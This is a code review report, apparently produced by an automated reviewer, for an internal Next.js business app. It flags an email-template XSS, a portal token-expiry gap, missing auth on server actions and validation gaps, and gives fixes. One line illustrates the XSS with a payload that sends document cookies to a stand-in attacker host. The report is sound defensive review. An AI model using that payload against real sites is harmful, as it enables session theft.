# CODE REVIEW REPORT

- Verdict: **NEEDS REVISION**
- Blockers: 2 | High: 5 | Medium: 8

---

## Blockers

### B1. XSS in invoice email HTML template (email-based stored XSS)
**File:** `/Users/narvisbot/strvx/apps/internal/src/lib/invoice-email.ts:26-27, 61-62, 94`

User-controlled fields (`item.description`, `data.clientName`, `data.clientEmail`, `data.notes`) are interpolated directly into raw HTML without escaping. A malicious client name or line item description like `<img src=x onerror=fetch('https://evil.com/'+document.cookie)>` would execute in the recipient's email client (many support embedded JS in HTML emails; most will at least render injected HTML, enabling phishing).

**Fix:**
```ts
function escapeHtml(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}
```
Wrap every `${data.*}` and `${item.*}` interpolation inside `buildInvoiceHtml` with `escapeHtml()`. Same applies to the weekly report template in `api/reports/weekly/route.ts:84-113` (though data there is system-generated, it is still good practice).

### B2. Portal project detail page skips token expiry check
**File:** `/Users/narvisbot/strvx/apps/internal/src/app/(portal)/portal/projects/[id]/page.tsx:10-28`

The `getPortalCompany()` function in the project detail page does NOT select `expiresAt` from `portalTokens` and does NOT check whether the token has expired. The portal home page (`portal/page.tsx:16-21`) correctly checks expiry. An expired token can still access individual project details.

**Fix:** Replicate the expiry check from `portal/page.tsx`:
```ts
const [portalToken] = await db
  .select({ companyId: portalTokens.companyId, expiresAt: portalTokens.expiresAt })
  .from(portalTokens)
  .where(eq(portalTokens.token, token));

if (!portalToken) return null;
if (portalToken.expiresAt && new Date(portalToken.expiresAt) < new Date()) return null;
```
Consider extracting `getPortalCompany()` into a shared utility to avoid this duplication bug recurring.

---

## High Priority

### H1. Missing auth on `getCompaniesAction` and `createCompanyAction` server actions
**File:** `/Users/narvisbot/strvx/apps/internal/src/app/actions.ts:1613-1622`

Both `getCompaniesAction()` and `createCompanyAction()` are exported `"use server"` functions but do NOT call `getCurrentUser()`. Since Next.js server actions can be invoked by any HTTP client that knows the action ID, an unauthenticated user could list all companies or create arbitrary companies.

**Fix:** Add `await getCurrentUser();` at the top of both functions, consistent with every other server action in the file.

### H2. Module-scope Anthropic/Resend client initialization crashes on missing env vars
**Files:**
- `/Users/narvisbot/strvx/apps/internal/src/lib/ai-proposals.ts:3-5`
- `/Users/narvisbot/strvx/apps/internal/src/lib/ai-sentiment.ts:3-5`
- `/Users/narvisbot/strvx/apps/internal/src/lib/invoice-email.ts:3`

These files initialize API clients at module scope:
```ts
const anthropic = new Anthropic({ apiKey: process.env.ANTHROPIC_API_KEY });
const resend = new Resend(process.env.RESEND_API_KEY);
```
If these modules are imported at build time or in any server context where the env vars are not set, they may throw or create a client with an undefined key. The API routes do check `process.env.ANTHROPIC_API_KEY` before calling these functions (which is good), but the module-level initialization has already run.

**Fix:** Use lazy initialization (like `stripe.ts` does with `getStripe()`):
```ts
let _anthropic: Anthropic | null = null;
function getAnthropic(): Anthropic {
  if (!_anthropic) {
    const key = process.env.ANTHROPIC_API_KEY;
    if (!key) throw new Error("ANTHROPIC_API_KEY is not set");
    _anthropic = new Anthropic({ apiKey: key });
  }
  return _anthropic;
}
```

### H3. Supabase client uses force unwrap (`!`) on env vars
**File:** `/Users/narvisbot/strvx/apps/internal/src/lib/supabase/server.ts:8-9`

```ts
process.env.NEXT_PUBLIC_SUPABASE_URL!,
process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
```
Same pattern in `middleware.ts:8-9`. If these vars are ever unset, the app crashes with a cryptic undefined error rather than a clear message.

**Fix:** Add a guard or use the client.ts pattern which does check for undefined:
```ts
const url = process.env.NEXT_PUBLIC_SUPABASE_URL;
const key = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
if (!url || !key) throw new Error("Supabase env vars not configured");
```

### H4. Missing UUID validation on `createTimeEntry`, `deleteTimeEntry`
**File:** `/Users/narvisbot/strvx/apps/internal/src/app/actions.ts:1062-1094`

`createTimeEntry` does not validate `data.projectId` as a UUID, and `data.date` is not validated at all (could be any string). `deleteTimeEntry` does not validate `entryId` or `projectId` as UUIDs. Other actions in the same file consistently validate IDs with `uuidSchema.safeParse()`.

**Fix:** Add `uuidSchema.safeParse()` for `projectId` and `entryId`, and validate `data.date` as an ISO date string.

### H5. `invoiceNumber` bypasses Zod validation in `saveInvoiceDraft`
**File:** `/Users/narvisbot/strvx/apps/internal/src/app/actions.ts:1781`

The `invoiceDraftSchema` does not include `invoiceNumber` as a validated field. On line 1781, `data.invoiceNumber` (the raw, unvalidated input) is written directly to the database. While Drizzle parameterizes the insert (preventing SQL injection), the value could be any arbitrary string -- empty, extremely long, or containing unexpected characters.

**Fix:** Either add `invoiceNumber: z.string().min(1).max(50).regex(/^STRVX-\d{4}-\d{3}$/)` to `invoiceDraftSchema`, or validate it separately before use.

---

## Medium Priority

### M1. Calendly webhook: existing contacts get no interaction logged
**File:** `/Users/narvisbot/strvx/apps/internal/src/app/api/webhooks/calendly/route.ts:100-141`

When a Calendly booking comes in from an existing contact (contact found by email), the webhook returns `{ ok: true, created: true }` (line 143) but no meeting interaction is logged for the existing contact's engagement. Only new contacts get a full pipeline entry. This means repeat bookings from existing clients are silently dropped.

**Fix:** Add an `else` branch after line 141 that finds the contact's engagement and logs a meeting interaction.

### M2. Goals API route: missing UUID validation on `id` field
**File:** `/Users/narvisbot/strvx/apps/internal/src/app/api/goals/route.ts:52, 86`

The PATCH and DELETE handlers accept `id` from the request body without validating it as a UUID. While Drizzle parameterizes the value, invalid IDs should be rejected early with a 400 response.

**Fix:** Add `if (!id || !z.string().uuid().safeParse(id).success) return NextResponse.json({ error: "Invalid goal ID" }, { status: 400 });`

### M3. LIKE metacharacter leakage in search and idempotency queries
**Files:**
- `/Users/narvisbot/strvx/apps/internal/src/lib/queries.ts:479` (`searchEngagements`)
- `/Users/narvisbot/strvx/apps/internal/src/app/api/webhooks/calendly/route.ts:72` (idempotency check)

User-supplied values used in `LIKE`/`ILIKE` patterns are not escaped for `%` and `_` wildcard characters. A search for `%` would match all records. The Calendly webhook uses `LIKE '%' || $uri || '%'` which could match unintended rows if the URI contained `%`.

**Fix:** Escape LIKE metacharacters: `query.replace(/%/g, '\\%').replace(/_/g, '\\_')` before wrapping with `%`.

### M4. Weekly report hardcoded team emails
**File:** `/Users/narvisbot/strvx/apps/internal/src/app/api/reports/weekly/route.ts:9`

`const TEAM_EMAILS = ["alex@strvx.com", "strvxteam@strvx.com"];` is hardcoded. If team members change, this requires a code deployment. Consider fetching active users from the `users` table or using an env var.

### M5. Portal auth: no CSRF protection
**File:** `/Users/narvisbot/strvx/apps/internal/src/app/api/portal/auth/route.ts:7-37`

The portal auth endpoint accepts POST with a JSON body and sets an httpOnly cookie with `sameSite: "lax"`. While `lax` provides some CSRF protection (blocks POST from cross-origin forms), a CSRF token or `sameSite: "strict"` would be more robust for authentication endpoints. The 30-day maxAge is generous for a portal access token.

**Fix:** Consider reducing `maxAge` to 7 days and/or adding a CSRF token check.

### M6. `race condition in getAllMercuryTransactions` -- not a bug but fragile pattern
**File:** `/Users/narvisbot/strvx/apps/internal/src/lib/mercury.ts:98-104`

The `allTxns.push(...transactions)` inside `Promise.all` is safe in single-threaded Node.js but could be confusing to future developers. Using `Promise.all` returning arrays and then flattening is the idiomatic pattern.

**Fix (optional):**
```ts
const results = await Promise.all(accounts.map(async (acct) => {
  const { transactions } = await getMercuryTransactions(acct.id, options);
  return transactions;
}));
return results.flat().sort(...);
```

### M7. `users` table import in `api/webhooks/calendly/route.ts` -- unused
**File:** `/Users/narvisbot/strvx/apps/internal/src/app/api/webhooks/calendly/route.ts:3`

The import `users` from schema is used (line 80), but `taskAssignees` is imported in the portal project detail page (line 6: `import { ... taskAssignees, users } from "@/lib/db/schema"`) but `taskAssignees` and `users` are never used in that file's queries.

**Actual file:** `/Users/narvisbot/strvx/apps/internal/src/app/(portal)/portal/projects/[id]/page.tsx:6`
```ts
import { portalTokens, companies, projects, tasks, taskAssignees, users } from "@/lib/db/schema";
```
`taskAssignees` and `users` are unused in this file -- tree-shaking handles it but it's dead code.

### M8. `nextExpId` mutable module-level state in finances client
**File:** `/Users/narvisbot/strvx/apps/internal/src/app/(app)/finances/finances-client.tsx:47`

```ts
let nextExpId = 100;
```
This mutable module-level variable in a "use client" component is used as a local expense ID counter. It survives across hot reloads and re-renders, which can cause stale or duplicate IDs. Since expenses are now persisted to the DB (the component calls `createExpenseAction`), this counter appears to be leftover from the mock-data era.

---

## Good Practices

- **SQL injection protection:** All raw SQL queries use Drizzle's `sql` tagged template which parameterizes values. No string concatenation of user input into SQL.
- **Auth checks:** All API routes (`/api/ai/*`, `/api/gmail/*`, `/api/drive/*`, `/api/apollo/*`, `/api/goals/*`, `/api/availability/*`) properly check Supabase auth. Webhook routes verify signatures (Stripe, Calendly).
- **Zod validation:** Server actions consistently use Zod schemas for input validation before database writes.
- **UUID validation:** Most server actions validate IDs with `uuidSchema.safeParse()` before use.
- **Transaction usage:** Multi-table writes (engagement creation, stage changes, prospect conversion) correctly use `db.transaction()`.
- **TypeScript compilation:** `tsc --noEmit` passes with zero errors.
- **Next.js build:** `next build` passes successfully with all routes compiling.
- **Client/server boundaries:** "use client" and "use server" directives are correctly applied with no mixing.
- **Schema consistency:** The Drizzle schema (`packages/db/src/schema.ts`) is comprehensive and includes proper foreign keys, cascading deletes, and indexes.
- **Error handling in external API calls:** Mercury, Gmail sync, and Google Calendar calls gracefully handle failures with try/catch and return empty/default values.
- **Stripe webhook:** Uses `constructEvent` with signature verification and timing-safe comparison (via `crypto.timingSafeEqual` in the Calendly webhook).
- **Portal data scoping:** Portal pages correctly scope queries to the authenticated company -- projects are filtered by `eq(projects.client, company.name)` and engagements by `eq(engagements.companyId, company.id)`.
